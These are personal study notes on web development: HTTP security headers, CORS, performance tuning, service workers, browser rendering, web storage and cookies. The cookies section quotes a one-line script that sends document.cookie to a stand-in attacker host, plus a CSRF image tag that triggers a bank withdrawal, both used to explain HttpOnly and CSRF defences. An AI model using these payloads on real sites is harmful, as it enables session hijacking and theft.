Strict-Transport-Security (HSTS) - force communication using HTTPS instead of HTTP, Upgrade-Insecure-Requests, X-Content-Type-Options - disables MIME sniffing and forces browser to use the type given in Content-Type,
X-Frame-Options(XFO) - indicates whether browser should be allowed to render a page in <frame>/<iframe>/<object>, X-XSS-Protection - enables cross-site scripting filtering

Cross-Origin Resource Sharing (CORS):
- mechanism that uses additional HTTP headers to let a user agent gain permission to access selected resources from a server on a different origin (domain) than the site currently in use
- user agent makes a cross-origin HTTP request when it requests a resource from a different domain, protocol, or port than the one from which the current document originated
i.e. HTML page served from http://domain-a.com makes <img> src request to http://domain-b.com/image.jpg, loading up images and scripts from separate domains like content delivery networks (CDN)
- XMLHttpRequest and Fetch API follow same-origin policy => web app using those APIs can only request HTTP resources from the same domain the application was loaded from unless CORS headers are used
- CORS mechanism supports secure cross-domain requests and data transfers between browsers and web servers

Web Performance Gains:
- Compress diligently (GZip, Brotli)
- Cache effectively through HTTP and Service Workers
- Minify and optimize
- Preresolve DNS for critical origins
- Preload critical resources
- Respect data plans
- Stream HTML responses
- Make fewer HTTP requests
- Have a font loading strategy
-> font-display: optional (if you can't do it fast have a fallback)
-> minimize font download by limiting range of characters you're loading
-> minimize FOIT (flash of invisible text) by using <link rel="preload">
- Send less JS through code splitting for smaller bundler sizes
- Lazy-load non-critical resources
- Route-based chunking
-> CommonChunksPlugin (Webpack)
-> Dynamic import()
- Optimize vendor libraries
-> NODE_ENV=production
- Fewer Moment.js locales (ContextReplacementPlugin())
- Transpile less code (babel-preset-env + modules: false, useBuiltins: true, Browserlist)
- Library sharding
- PRPL pattern
-> Push the minimal code for the initial route (request and push/preload critical scripts)
-> Render route and get interactive
-> Pre-cache using Service Workers to cache remaining resources
-> Lazy-load async (split) routes before navigating to other routes
- Tree-shaking (Webpack, Rollup) to remove dead code
- Serve modern browsers ES2015 (babel-preset-env)
- Scope hoisting (Webpack)
-> modules get wrapped into functions isolating their scope while imports get transpiled into variables holding result of 
Webpack require function, wrapped modules go to an array at end of our bundle
-> each import translates into an extra function call and a property access to modules array
-> scope hoisting to detect where these import chaining can be flattened and converted into one inlined function without compromising our code
-> this saves an extra function call and access to the modules array so code runs faster
-> need to use ModuleConcatenationPlugin
- don't ship dev code to prod

- Progressive Web Apps (using service workers to cache assets and have an offline experience and IndexedDB for transactions/data store)
-> Service Workers
  act as proxy servers that sit between web applications, browser, and network when available; intercept requests, update assets on server, create offline experience,
  allow access to push notification and background sync APIs

  event-driven worker registered against origin and path, takes form of JS file that can control webpage associtaed with it, intercepting and modifying navigation and resource requests
  and caching resources

  run in a worker context: no DOM access, runs on different thread to main JS so it is not blocking, designed to be fully async
  (can't use synchronous XHR or localStorage here)

  run over HTTPs only to prevent man in middle attacks, makes heavy use of promises

  first registered using ServiceWorkerContainer.register() method to download service worker to client and attempt to install/activate for URLs accessed by user inside
  whole origin or subset specified by you

  lifecycle of download every 24 hours, install based on newly downloaded files, activate when no other pages loaded still using old service worker
  but one can use ServiceWorkerGlobalScope.skipWaiting() and existing pages can be claimed by active worker using Clients.claim()

  can listen for InstallEvent to prepare service worker for usage when this fires like creating cache using built in storage API and placing assets inside it you'll
  want for running app offline; activate event for you to clean up old caches and other things from previous version of service worker

  can response to requests using the FetchEvent event and cna modify response to these requests in any way you want using FetchEvent.respondWith method

  use cases: background data sync, responding to resource requests from other origins, centralized updates to expensive-to-calculate data like geolocation or gyroscope
  so multipe pages can make use of one set of data, client-side compiling and dependency management, hooks for background services, custom templating based on certain URL patterns,
  performance enhancements for pre-fetching resources user is likely to need in near future

  app shell model: minimal HTML, CSS, and JS required to power user interface and when cached offline can ensure instant, reliably good performance to users on repeat visits;
  shell not loaded from network every time user visits; aggressively caching shell using service worker, dynamic content loads for each page using JS, get initial HTML onto screen
  should load fast, use little data as possible, use static assets from local cache, separate content from navigation, retrieve and display page-specific content, optionally cache dynamic content

- Using a Content Delivery Network to cache assets at edge locations in different regions i.e. AWS CloudFront

- Notes:
  high performing sites engage and retain users better (Google Score Card and Impact Calculator), better user experience
  audit what resources you send to users: do you really need Bootstrap or Foundation to build UI? can just use CSS Flexbox and Grid
  -> CSS is render blocking resource and overhead of CSS framework can delay rendering significantly
  -> JS libraries convenient but not always necessary like jQuery i.e. querySelector, querySelectorAll; event binding with addEventListener, classList, setAttribute, getAttribute
  using Preact rather than React, Zepto rather than jQuery
  -> not all websites need to be SPAs as they make extensive use of JS (most expensive resource we serve on web byte for byte) - needs to be downloaded, parsed, compiled, executed
    can possibly do HTTP caching and use service worker
  -> can fix how you send resources like migrating to HTTP/2 to address concurrent request limits and lack of header compression, expedite delivery of resources using resource hints
  like rel=preload to allow early fetches of critical resources before browser would discover them to lower time to interactive, rel=preconnect for resources on third party domains
  -> HTTP/1 led to bundling styles and scripts but HTTP/2 may have cheaper multiple simultaneous requests; code splitting in webpack to limit amount of scripts downloaded to only what is
  needed by current page or view, separate CSS intos maller template or component-specific files
  -> mind how much data you spend: minify text assets (removing unnecessary whitespace, comments, other content), uglification in JS (shortening variable and method names),
  configure server to compress resources (GZIP, Brotli compression), optimize images/serving alternative formats like WebP for smaller file size, send images responsively (proper size for certain screen widths)
  by adding srcset attribute to <img> element to specify array of images the browser can choose from or <picture> to choose optimal image format for browser, client hints for network/device characteristics

  - RAIL: response, animation, idle, load (300ms to 1000ms)
  -> respond in under 50m, animate and produce a frame in 10ms or less, maximize idle time, load: deliver content and become interactive in under 5 seconds
  -> measure through Chrome DevTools - throttle CPU/network, view main thread activities, analyze FPS, view network requests, view paint events and scroll performance issues in real-time, Lighthouse, WebPageTest

  Rendering Performance:
  -> most devices had 60fps, all work needs to be completed inside 10ms; otherwise frame rate drops and content judders on screen = jank
  -> pixel pipeline:
    1. JS: to handle work resulting in visual changes like animate function in jQuery, adding DOM elements to page dynamically though there are CSS animations too
    2. Style calculations: figuring out which CSS rules apply to which elements based on matching selectors
    3. Layout: calculates how much space each element takes up and where it is on screen and one element can affect otherwise
    4. Paint: process of filling in pixels and drawing out text, colors, images, borders and shadows, done onto multiple surfaces called layers
      - creating a list of draw calls and "rasterization" = filling in pixels
    5. Compositing: multiple layers need to be drawn onto screen in correct order so page renders correctly i.e. overlapping elements

    three ways pipeline normally plays out
    1. JS/CSS > Style > Layout > Paint > Composite
      if you change a layout property like changing an element's geometry like width, height, position with left or top, browser will have to check
      all other elements and "reflow" the page and any affected areas will need to be repainted and final painted elements will need to be composited back together
    2. JS/CSS > Style > Paint > composited
      if you change a "paint only" property like a background image, text color, shadows that do not affect layout of page, then browser skips layout but will do paint
    3. JS/CSS > Style > Composite
      if you change a property that requires neither layout nor paint and browser jumps to compositing = cheapest and most desirable for high pressure points in app's lifecyle like
      animations or scrolling

    optimizing JS execution
      -> avoid setTimeout or setInterval for visual updates; use requestAnimationFrame instead; move long-running JS off main thread to web workers
      -> use micro-tasks to make DOM changes over several frames
      -> use Chrome DevTools' Timeline and JS Profiler to assess impact of JS

    reduce scope and complexity of style calculations
      -> adding and removing DOM elements, changing attributes, classes or through animation will cause browser to recalculate element styles
      and in many cases layout or reflow the page or parts of it = computed style calculations
      1. creating a set of matching selectors (browser figuring out which classes, pseudo-selectors and IDs apply to any given element)
      2. taking all style rules from matching selectors and figuring out what final styles element has
      -> reduce complexity of selectors through use of class-centric methodology like Bellman
      -> reduce number of elements on which style calculation must be calculated
        worst case is number of element multiplied by selector count because each element needs to be at least checked once against every style to see if it matches
      
      avoid large, complex layouts and layout thrashing
      -> concerns about number of elements that require layout, complexity of layouts
      -> layout normally scoped to whole document, number of DOM elements will affect performance so you should avoid triggering layout wherever possible
      -> assess layout model performance i.e. Flexbox is faster than older Flexbox or float-based layout models or position elements
      -> avoid forced synchronous layouts and layout thrashing; read style values then make style changes

      simplify paint complexity and reduce paint areas
      -> changing any property apart from transforms or opacity always triggers paint
        triggering layout always triggers paint; others like background/textcolor/shadows
      -> paint is often the most expensive part of pixel pipeline so avoid it where you can
      -> reduce paint areas through layer promotion and orchestration of animations
        browsers union together two areas that need painting and can result in entire screen being repainted i.e. fixed header and rest of body
        orchestrate animations and transitions to not overlap as much
      -> use DevTools paint profiler to assess paint complexity and cost, reduce where you can

      stick to compositor-only properties and manage layer count
      -> stick to transform and opacity changes for animations
      -> promote moving elements with will-change or translateZ
      -> avoid overusing promotion rules; layers require memory and management

      debounce input handlers
      -> avoid long-running input handlers as they can block scrolling
      -> don't make style changes in input handlers
      -> debounce handlers; store event values and deal with style changes in the next requestAnimationFrame callback
        editing and then reading styles can result in layout thrashing (read first then edit styles)


Local Storage:
- read-only window.localStorage property allows you to access Storage object for Document's origin
- stored data is saved across browser sessions, has no expiration time
- around 5MB, only string data (though you can serialize everything), synchronous, can't be used by web workers
- any JS code on page can access local storage and no data protection
- can store public, insensitive information, for string data/not larger than 5MB and not used in high-performance app
- beware of XSS if you store session/user sensitive information; attacker running JS on your website and sending local storage information
to their own domain
-> if website contains any third party JS code from source outside domain i.e. bootstrap, jQuery, React, ad network, Google Analytics, tracking code,
you are at risk for other JS running on you website if say any of those sources are compromised
-> don't store JSON Web Tokens (session data) in local storage as sattackers can make requests to website on your behalf
-> to store sensitive data (user IDs, session IDs, JWTs, personal/credit card information, API keys), always use a server-side session
-> when logging into website, create session identifier and store it in cryptographically signed cookie
-> make sure web framework for cookies is setting httpOnly flag as it makes it impossible for a browser to read any cookies and also set SameSite=strict cookie flag
to prevent CSRF attacks as well as secure=true flag to ensure cookies can only be set over an encrypted connection
-> each time user makes a request to your site, use session ID extracted from cookie sent to you to retrieve accounts details from db or cache
- Caveats with Private Browsing Mode:
  Safari returns null for any item set using localStorage.setItem either before or during the private browsing session. 
  In essence, neither sessionStorage or localStorage are available in private brosing mode

  Chrome and Opera return items set previous to private ("incognito") browsing, but once private browsing commences, 
  treats localStorage like sessionStorage (only items set on the localStorage by that session will be returned) but like localStorage for other private windows and tabs

  Firefox, like Chrome will not retrieve items set on locaStorage prior to a private session starting, but in private browsing treats localStorage like sessionStoroage for non private windows and tabs, but like localStorage for other private windows and tabs

Session Storage:
- window.sessionStorage, data stored in sessionStorage gets cleared when page session ends or when page is closed, specific to protocol of the page


Cookies:
- HTTP cookie (web cookie/browser cookie) is a small piece of data that a server sends to the user's web browser
and browser may store it and send it back with next request to same server
-> typically used to tell if two requests came from the same browser to keep a user logged in; remembers stateful information for stateless HTTP protocol
- mainly used for session management (logins, shopping carts, game scores, anything server should remember)
-> personalization (user preferences, themes, other settings)
-> tracking (recording and analyzing user behavior)
- used to be used for general client-side storage until sessionStorage, localStorage, indexedDB came out
- since cookies are sent with every request, they can worsen performance (especially for mobile data connections)
- when receiving HTTP request, server can send a "Set-Cookie" header with response and this cookie stored by browser and then cookie is sent with requests made
to the same server inside a "Cookie" HTTP header
-> expiration date or duration can be specified and after which cookie is no longer set; can also set restrictions to a specific domain and path
i.e. header from server tells client to store a cookie
Set-Cookie: <cookie-name>=<cookie-value>

HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

// session cookie set
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
- session cookies: deleted when client shuts down because it didn't specify Expires or Max-Age directive though browsers may use session restoring
which makes most session cookies permanent as if browser was never closed
- permanent cookies: expire at a specific date (Expires) or after a specific length of time (Max-Age)
i.e. Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
- secure cookie is only sent to server with an encrypted request over the HTTPS protocol
-> even with Secure, sensitive information should never be stored in cookies as they are Insecure
-> to prevent cross-site scripting (XSS) attacks, HttpOnly cookies are inaccessible to JS's Document.cookie API and are only sent to server
i.e. cookies that persist server-side sessions don't need to be available to JS and HttpOnly Flag should be set
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
- Domain and Path directives define the scope of the cookie: what URLs the cookies should be sent to
-> Domain: specifies allowed hosts to receive the cookie (subdomains included), defaults to host of current document location
-> Path: indicates URL path that must exist in requested URL in order to send the Cookie header i.e. /docs
- SameSite cookies let servers require that a cookie shouldn't be sent with cross-site requests which somewhat prevents against cross-site request forgery attacks
-> not yet supported by all browsers
- new cookies can be created via Document.cookie property and if HttpOnly flag is not set, existing cookies can be accessed from JS as well
-> cookies available to JS can get stolen through XSS
- confidential/sensitive information should never be stored or transmitted in HTTP Cookies as mechanism is insecure
-> cookies often used in web app to identify a user and authenticated session, so stealing a cookie can lead to hijacking the authenticated user's session
i.e. social engineering or exploiting XSS vulnerability but HttpOnly cookie can help mitigate this attack by preventing access to cookie value through JS
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
-> CSRF: say image isn't really an image but a request to steal your information/money
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
-> if logged into account and cookies still valid, will transfer money as soon as you load HTML that contains img
-> can prevent this through input filtering, should always be confirmation required for any sensitive action, cookies for sensitive actions should have a short lifetime only
-> can also verify Same Origin and check CSRF tokens
- cookies have domain associated to them; if same domain as the page you're on, cookies are a first-party cookie and sent only to server setting them; if different, third-party cookie
and third-party cookies for tracking and advertising in third-party components (some add-ons can block them)
-> can set clear disclosures/privacy policies to notify users of cookies
-> Do-Not-Track, zombie/"Evercookies" recreated after deletion and are intentionally hard to delete forever

REST API:
REST stands for Representational State Transfer, an architectural style that has largely been adopted as a best practice for building web and mobile applications. 
RESTful services are designed to be lightweight, easy to maintain, and scaleable. 
They are typically based on the HTTP protocol, make explicit use of HTTP methods (GET, POST, PUT, DELETE), are stateless, use intuitive URIs,
and transfer XML/JSON data between the server and the client.


